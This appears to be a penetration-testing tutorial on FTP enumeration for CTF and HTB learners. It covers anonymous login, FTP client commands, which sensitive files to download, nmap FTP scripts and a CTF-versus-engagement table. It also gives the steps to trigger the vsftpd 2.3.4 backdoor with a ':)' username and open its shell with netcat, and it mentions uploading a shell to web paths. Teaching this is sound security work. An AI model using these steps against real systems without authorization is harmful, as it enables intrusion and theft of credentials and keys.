# 📁 FTP Enumeration

FTP (File Transfer Protocol) is one of the oldest protocols still running on modern systems. It was designed in the 1970s to transfer files between computers — and it still does exactly that, often with little to no security. When nmap finds port 21 open, you have something worth investigating.

## 🧠 What is FTP — Plain English

FTP is a protocol for transferring files between computers over a network. Think of it like a shared filing cabinet that you connect to over the internet or a local network. You log in, browse the files, and download or upload what you need.

The problem from a security perspective is that FTP was built before security was a priority:
- Credentials are transmitted in **plain text** — anyone watching the network can read your username and password
- Many FTP servers are configured to allow **anonymous login** — meaning anyone can connect without credentials
- Files left on FTP servers are often sensitive — backups, configs, database dumps, credentials

**Ports:**
- `21` — FTP control channel (commands)
- `20` — FTP data channel (file transfers)
- `990` — FTPS (FTP over SSL) control channel

## 🔍 Anonymous Login — Always Try This First

Anonymous FTP allows anyone to log in without a password. It was originally designed for public file distribution but is frequently left enabled on servers that should be private.
```bash
# Connect to FTP server
ftp <target>

# When prompted for username — type:
anonymous

# When prompted for password — type anything:
anonymous@
# or just press Enter
```

If anonymous login works you'll see:
```
230 Login successful.
ftp>
```

If it fails you'll see:
```
530 Login incorrect.
```

## 🖥️ Basic FTP Commands

Once connected — whether as anonymous or with credentials — these are the commands you need:
```bash
ftp> ls              # list files and directories
ftp> ls -la          # list all files including hidden
ftp> cd FolderName   # change directory
ftp> pwd             # show current directory
ftp> get filename    # download a single file
ftp> mget *          # download ALL files in current directory
ftp> put filename    # upload a file
ftp> binary          # switch to binary mode (use for non-text files)
ftp> ascii           # switch to ASCII mode (use for text files)
ftp> bye             # disconnect
```

> 💡 **Always switch to binary mode before downloading non-text files** — images, executables, zip files, databases. ASCII mode corrupts binary files during transfer.

## 📦 Installation

**Linux/macOS:** Pre-installed on most systems
```bash
# If not installed
sudo apt install ftp        # Linux
brew install inetutils      # macOS
```

**Windows:** Built into Windows — open Command Prompt and type `ftp`

For a better FTP client experience:
- **Linux/macOS:** `lftp` — `sudo apt install lftp` or `brew install lftp`
- **Windows:** FileZilla — https://filezilla-project.org

## 🔎 What to Look For

**Files worth downloading immediately:**
- Any `.txt`, `.cfg`, `.conf`, `.ini` files — often contain credentials
- Any `.bak`, `.backup`, `.old` files — backups of configs or databases
- Any `.sql` files — database dumps
- Any `.php`, `.py`, `.sh` files — source code that might contain hardcoded credentials
- Any `.key`, `.pem`, `.pub` files — SSH keys or certificates
- `.htpasswd` files — Apache password files

**Signs you're on something interesting:**
- You can write files to the server (upload access)
- You find a directory that maps to a web server path (upload a shell)
- You find credentials in config files that work elsewhere

## ⚙️ Automated Enumeration with nmap

Before connecting manually, let nmap tell you what the FTP server is running:
```bash
# Get FTP banner and version
nmap -sV -p 21 <target>

# Run FTP-specific scripts
nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p 21 <target>

# Check for anonymous login specifically
nmap --script ftp-anon -p 21 <target>
```

**Notable nmap FTP scripts:**
| Script | What it checks |
|---|---|
| `ftp-anon` | Tests for anonymous login and lists accessible files |
| `ftp-vsftpd-backdoor` | Checks for the infamous vsftpd 2.3.4 backdoor |
| `ftp-bounce` | Tests for FTP bounce attack vulnerability |
| `ftp-syst` | Gets system information from the FTP server |

## ⚠️ vsftpd 2.3.4 — The Famous Backdoor

vsftpd 2.3.4 was a widely used FTP server that had a backdoor introduced into its source code in 2011. When you send a username containing `:)` — a smiley face — the backdoor opens a shell on port 6200.

If nmap identifies vsftpd 2.3.4, check for this immediately:
```bash
# Check with nmap
nmap --script ftp-vsftpd-backdoor -p 21 <target>

# Manual check — if vulnerable, port 6200 opens after this
ftp <target>
Username: anything:)
Password: anything

# Then connect to the backdoor shell
nc <target> 6200
```

This vulnerability appears on HTB and is a classic example of why version detection matters.

## ⚔️ CTF vs Professional Use

| Situation | CTF | Professional Engagement |
|---|---|---|
| Anonymous login | Try immediately | Try immediately — document finding |
| Download all files | Yes — grab everything | Yes — document what was accessible |
| Upload files | Try it | Only if explicitly in scope |
| Brute force credentials | If no lockout | Check password policy first |
| vsftpd backdoor | Exploit it | Document — critical finding |
